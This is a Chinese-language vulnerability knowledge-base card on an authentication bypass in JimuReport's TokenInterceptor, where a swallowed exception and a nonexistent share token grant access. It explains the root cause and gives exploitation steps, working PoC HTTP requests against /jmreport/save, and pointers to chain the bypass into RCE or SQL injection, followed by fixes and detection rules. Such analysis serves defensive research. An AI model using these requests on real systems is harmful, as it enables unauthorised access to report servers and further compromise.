---
id: web-java-component-jimureport-token-interceptor-jmlink-auth-bypass
title: JimuReport TokenInterceptor 鉴权绕过：previousPage + 数据库中不存在的 jmLink/shareToken/JmReport-Share-Token 即放行
type: scenario
domain: web
path: web/java/component
technique: jimureport-token-interceptor-share-token-auth-bypass
tags:
- java
- jimureport
- jeecgboot
- auth-bypass
- token
- interceptor
- share-token
- access-control
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-08T00:37:24+08:00'
  notes: 已完整 Read content.md 并逐张 Read img 全部 52 图：01 jar 名 jimureport-spring-boot-starter-1.7.6.jar（仅调试环境）；02-05 JimuReportTokenInterceptor.preHandle（contextPath 截取、XSS 检查、customPrePath、/jmreport/shareView/ 放行、@JimuNoLoginRequired）；06 空 catch 吞 verifyToken 异常；07 verifyToken 空 token 抛 JeecgBoot401Exception；08 isShareingToken 的 header/shareToken/jmLink 优先级、Base64 解码、split(\|\|)、长度==2 才赋值 var3/var4、空 var3 return false、查 jimu_report_share、状态!=0 return false；09 view 前缀分支（var4 空 return false；count>0 提前 true；否则落到最终 return true）；10 表结构；11 调试 previousPage 非空+isShareingToken=true；12 save+jmLink=ZmZmfHx3d3c= 返回 success:true；13 save+shareToken=123456 success:true；14 JmReport-Share-Token:123456 success:true；15-21 queryFieldBySql 空 token NPE（TokenUtils.splitToken token.split(\.)）与补 token 后成功；22-27 FreeMarker SAFER_RESOLVER 拉黑 Execute/JythonRuntime/ObjectConstructor；28-52 save→jimu_report.json_str→show→ExpressUtil→Aviator 5.2.6 Expression.execute/executeDirectly 的完整链与 BCEL/use+defineClass 内存马 POC。核对结论：空
    catch 吞异常、previousPage 非空、库中不存在的分享凭据即 return true 三条主链路与原文/截图一致。\n【修正】按图 08/09 的字节码修正三处：① jmLink split 长度不为 2 时并不会直接 return false，而是不赋值 var3/var4、随后由空 var3 检查拒绝（若另有 header/shareToken 则沿用其值）；② /jmreport/view 前缀下只有 var4 为空才 return false，link 计数 >0 是提前 true，计数为空/0 会落到最终 return true，并非拒绝条件；③ 一句话结论与变体相应改为『view 前缀只需 jmLink 第二段非空』。\n【版本】原文只给出调试 jar 1.7.6、未给受影响版本区间，按 brief『只是目标环境版本则 --clear』已 set-versions --clear（正文仍保留原文环境说明）。\n未验证点：未复跑环境；未执行文中 PoC；frontmatter 无 sources/source_url。skip 合理性：Aviator/FreeMarker 单元格表达式注入已有 verified 卡 web-java-component-jimureport-save-cell-expression-injection-rce 覆盖（注：该卡称 FreeMarker ?new Execute 可用，而本篇 1.7.6 实测被 SAFER_RESOLVER 拉黑，疑为版本差异，留待维护者复核，不在本卡范围）。kb show 存在；dedup top1 为自身，其余候选（unauth-aviator/RCE、jeeWMS/TokenRenewal/LoginAdminFilter 等鉴权绕过）机制不同；dup-scan 中与 16490 drag getTotalData FreeMarker SQLi 为 related，非同一链，保留。
url: /docs/web/java/component/web-java-component-jimureport-token-interceptor-jmlink-auth-bypass/
draft: false
kb_aliases:
- JimuReport 权限绕过
- jmLink 绕过
- shareToken 绕过
- JmReport-Share-Token
- previousPage 绕过
- isShareingToken 绕过
- 积木报表未授权访问
---

## 一句话结论

JimuReport 的 `JimuReportTokenInterceptor` 在 `verifyToken()` 抛异常时用空 `catch` 吞掉异常并继续执行；随后只要请求带非空 `previousPage`，并且 `jmLink`（Base64 的 `a||b`，取 `a` 查库）、`shareToken` 参数或 `JmReport-Share-Token` 头的值在 `jimu_report_share` 表中不存在，`isShareingToken()` 就会一路走到 `return true`，未登录即可访问 `/jeecg-boot/jmreport/save` 等受保护接口。`/jmreport/view` 前缀只会额外要求 jmLink 第二段（link id）非空；link 计数 >0 时提前返回 true，计数为 0/空仍会落到最终 `return true`，所以 `/save` 等路径同样可绕过。

## 原理

- **拦截器入口**：`preHandle` 先取 `request.getRequestURI().substring(contextPath.length())` 得到 `/jmreport/save`；做 XSS 检查、读取 `customPrePath`，若路径包含 `/jmreport/shareView/` 直接放行；再检查方法是否有 `@JimuNoLoginRequired` 注解。
- **token 异常被吞**：没有免登录注解时进入 `try { var10 = verifyToken(request); } catch (Exception var14) {}`。`verifyToken` 在 token 为空时抛 `JeecgBoot401Exception`，但空 `catch` 不重新抛出、不设置拒绝，`var10` 保持 false，流程继续。
- **分享校验分支**：`if (!var10)` 后先调 `isSharingEffective(path, request)`；不成立时读取 `previousPage`，仅当 `previousPage` 非空才调用 `isShareingToken(path, request)`；否则返回“Token校验失败”。
- **`isShareingToken` 的漏洞逻辑**：
  1. 读 `JmReport-Share-Token` 头；若为空，则取请求参数 `shareToken`，再取 `jmLink`；
  2. `jmLink` 做 Base64 解码（解码失败 `return false`）、按 `\\|\\|` 分割；仅当数组长度恰为 2 时才把 `parts[0]/parts[1]` 赋给 `var3/var4`，否则 `var3` 沿用 header/shareToken 取到的值（通常为空，随后被空值检查拒绝）；
  3. 若 `var3` 为空，`return false`；否则用 `var3` 去 `jimu_report_share` 表按 `share_token` 查记录；
  4. 若记录存在且状态不为 `"0"`，`return false`；
  5. 若请求路径以 `/jmreport/view` 开头：`var4` 为空则 `return false`；非空时查 `jimu_report_link` 中该 link 计数，>0 提前 `return true`，计数为空/0 并不拒绝，继续落到最终 `return true`；
  6. 以上都不触发时，最终 `return true`。
- **为什么是不存在的值反而放行**：正因为查库结果为空（`var10 == null`），才跳过了“分享已失效/状态不为 0”的拒绝分支；而 `/jmreport/save`、`/jmreport/queryFieldBySql` 等路径不以 `/jmreport/view` 开头，也不会进入 link 计数检查。因此攻击者用一个数据库里没有的 `share_token` 就能把“分享校验”变成恒真。
- **后续 NPE 的处理**：绕过拦截器后，部分接口仍会取 token 调 `JwtUtil.getUsername` → `TokenUtils.splitToken(token)`，内部 `token.split("\\.")` 对 null 抛 NPE。只要额外传入任意非空 token（如 `token=waibibabu`），就能跳过该 NPE，让接口继续执行。

## 触发条件

- 目标使用含 `JimuReportTokenInterceptor` 的 JimuReport（原文环境为 `jimureport-spring-boot-starter 1.7.6`，jeecg-boot 集成）。
- 目标接口路径不以 `/jmreport/shareView/` 开头、方法上没有 `@JimuNoLoginRequired`（这两类本来就放行，无需本绕过）。
- 请求携带非空 `previousPage`，并提供以下任一分享凭据：
  - `jmLink`：Base64(`任意非空字符串 + "||" + 任意字符串`)，且前半段在 `jimu_report_share` 中不存在；
  - `shareToken` 参数：数据库中不存在的值；
  - `JmReport-Share-Token` 请求头：数据库中不存在的值。
- `verifyToken` 因 token 为空/非法抛异常并被拦截器吞掉。
- 对会读取 token 的后续接口，额外提供任意非空 `token` 以绕过 `split(".")` 的 NPE。

## 利用步骤

1. 确认目标为 JimuReport/JeecgBoot，接口形如 `/jeecg-boot/jmreport/save`、`/jmreport/queryFieldBySql`。
2. 构造任意“库中不存在”的分享凭据：`jmLink=Base64("aaa||bbb")`（如 `YWFhfHxiYmI=`），或 `shareToken=123456`，或头 `JmReport-Share-Token: 123456`。
3. 在 URL 上带 `previousPage=xxx`，不带有效登录态；对 `/save` 直接 POST 报表 JSON，观察是否返回 `success:true` 而非“Token校验失败，无权限访问！”。
4. 若接口报空指针（`TokenUtils.splitToken`），追加 `token=waibibabu` 等任意非空值再试；`queryFieldBySql` 可用 `{"sql":"select '1'"}` 验证解析成功。
5. 拿到未授权访问后，可继续调用 `/jmreport/save` 保存恶意报表、再用 `/jmreport/show` 触发表达式执行（另见 JimuReport 单元格表达式注入卡），或调用其它需鉴权的报表接口。
6. 记录请求/响应作为证据；不要触发破坏性操作。

## PoC

```http
POST /jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
Host: target:8080
Content-Type: application/json;charset=UTF-8
Content-Length: 2

{}
```

或使用分享 token 参数/请求头：

```http
POST /jeecg-boot/jmreport/save?previousPage=xxx&shareToken=123456&token=waibibabu HTTP/1.1
Host: target:8080
Content-Type: application/json

{}
```

```http
POST /jeecg-boot/jmreport/save?previousPage=xxx HTTP/1.1
Host: target:8080
JmReport-Share-Token: 123456
Content-Type: application/json

{}
```

原文实测：带 `previousPage=xxx&jmLink=YWFhfHxiYmI=` 的 `save` 请求返回 `success:true`；`queryFieldBySql` 在补 `token=waibibabu` 后返回“解析成功”。

## 变体与关联

- 凭据变体：`jmLink`、`shareToken`、`JmReport-Share-Token` 三条路径最终都汇入同一 `isShareingToken` 逻辑，任选一条即可；`jmLink` 必须能 Base64 解码且按 `||` 切成恰好两段。
- 路径变体：`/jmreport/view` 前缀会额外要求 jmLink 第二段（link id）非空；link 计数 >0 时提前 return true，计数为 0/空也不会拒绝（最终仍 return true）。实际利用可优先用 `/jmreport/save`、`/jmreport/queryFieldBySql`、`/jmreport/loadTableData` 等路径。
- 与既有 JimuReport 未授权卡的区别：另一类未授权是打印插件硬编码签名（`X-Sign = MD5(body+secret)`）导致的；本草稿是 TokenInterceptor 吞异常 + 分享 token 不存在即放行的逻辑缺陷，入口请求头/参数不同。
- 关联：绕过成功后接 `/jmreport/save` 单元格表达式注入（Aviator/FreeMarker）可升级为 RCE；也可接 `queryFieldBySql` 的 SQL 注入/文件读取。

## 检测与防御

- 修复 `verifyToken` 的异常处理：捕获异常后必须拒绝请求（return false/抛出 401），不能继续走分享分支；对 `isShareingToken` 要求分享记录必须存在且状态有效，不能以“查不到”为通过条件；`/jmreport/view` 之外也不应无条件 `return true`。
- 升级 JimuReport 到修复版本；对所有 `/jmreport/*` 接口强制鉴权，分享接口只对只读渲染开放并校验 link 计数。
- 检测：请求同时出现 `previousPage` 与 `jmLink`/`shareToken`/`JmReport-Share-Token`，且无有效 token；`jmLink` Base64 解出 `||`；`jimu_report_share` 查询不到对应 token 却返回 200；同一 IP 探测多个 `/jmreport/*` 路径。
- 审计：检查 `JimuReportTokenInterceptor` 的空 catch、`isShareingToken` 的返回路径；对报表接口做未授权回归测试。
